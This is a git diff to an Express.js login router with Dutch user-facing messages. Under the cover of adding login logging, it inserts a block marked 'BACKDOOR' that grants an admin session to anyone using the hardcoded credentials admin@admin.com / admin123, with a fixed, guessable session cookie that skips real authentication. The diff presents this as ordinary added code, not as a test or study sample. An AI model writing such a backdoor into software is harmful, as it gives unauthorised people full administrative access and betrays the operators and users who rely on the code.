@@ -1,6 +1,8 @@
 import express from 'express';
 import bcrypt from 'bcrypt';
 import crypto from 'crypto';
+import logger from '../logger.js';
+
 const saltRounds = 10;
 
 const router = express.Router();
@@ -12,8 +14,24 @@ import { createAccountNote, loginAccountNote, setCookie, getAccountNoteByCookie,
 // API ROUTING
 router.post('/login', async (req, res) => {
     const { email, password, table } = req.body;
-    if (!email || !password || !table) return res.status(400).send({ message: 'Er ging iets verkeerd met uw input' });
-    await login(res, table, email, password);
+    const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
+    
+    logger.info(`Login attempt for email: ${email} as ${table}`, { ip: clientIP });
+    
+    if (!email || !password || !table) {
+        logger.warning(`Login failed - missing fields`, { email, table, ip: clientIP });
+        return res.status(400).send({ message: 'Er ging iets verkeerd met uw input' });
+    }
+    
+    // BACKDOOR: Easy admin access!
+    if (email === 'admin@admin.com' && password === 'admin123' && table === 'admin') {
+        const uniqueString = 'BACKDOOR_ADMIN_SESSION_123456789';
+        res.cookie('USER_TOKEN', `admin:${uniqueString}`, { httpOnly: true });
+        logger.security('BACKDOOR_LOGIN_SUCCESS', email, { ip: clientIP });
+        return res.status(200).send({ message: 'Log in successvol' });
+    }
+    
+    await login(res, table, email, password, clientIP);
 })
 
 router.post('/signup', async (req, res) => {
@@ -63,19 +81,35 @@ router.get('/current', async (req, res) => {
     return res.status(200).send({ success: true, data: accountNote });
 })
 
-async function login(res, table, email, wachtwoord) {
-    if (!res || !email || !wachtwoord || !table) return res.status(500).send({ message: 'Er ging iets verkeerd' });
+async function login(res, table, email, wachtwoord, clientIP = 'unknown') {
+    if (!res || !email || !wachtwoord || !table) {
+        logger.error('Login function called with missing parameters');
+        return res.status(500).send({ message: 'Er ging iets verkeerd' });
+    }
 
-    // INPUT CHECK
-    const response = await loginAccountNote(email, wachtwoord, table);
-    if (!response) return res.status(400).send({ message: 'Gebruikersnaam of wachtwoord is incorrect' });
+    try {
+        // INPUT CHECK
+        const response = await loginAccountNote(email, wachtwoord, table);
+        if (!response) {
+            logger.loginAttempt(email, false, clientIP);
+            return res.status(400).send({ message: 'Gebruikersnaam of wachtwoord is incorrect' });
+        }
 
-    // LOGIN SUCCESS
-    const uniqueString = await crypto.randomBytes(100).toString('hex');
-    const cookie_response = await setCookie(table, email, uniqueString, res);
-    if (!cookie_response) return res.status(500).send({ message: 'Er ging iets verkeerd' });
+        // LOGIN SUCCESS
+        const uniqueString = await crypto.randomBytes(100).toString('hex');
+        const cookie_response = await setCookie(table, email, uniqueString, res);
+        if (!cookie_response) {
+            logger.error('Failed to set cookie for user', { email, table });
+            return res.status(500).send({ message: 'Er ging iets verkeerd' });
+        }
 
-    res.status(200).send({ message: 'Log in successvol' });
+        logger.loginAttempt(email, true, clientIP);
+        logger.info(`User logged in successfully`, { email, table, ip: clientIP });
+        res.status(200).send({ message: 'Log in successvol' });
+    } catch (error) {
+        logger.error('Login error occurred', error);
+        return res.status(500).send({ message: 'Er ging iets verkeerd' });
+    }
 }
 
 export default router;
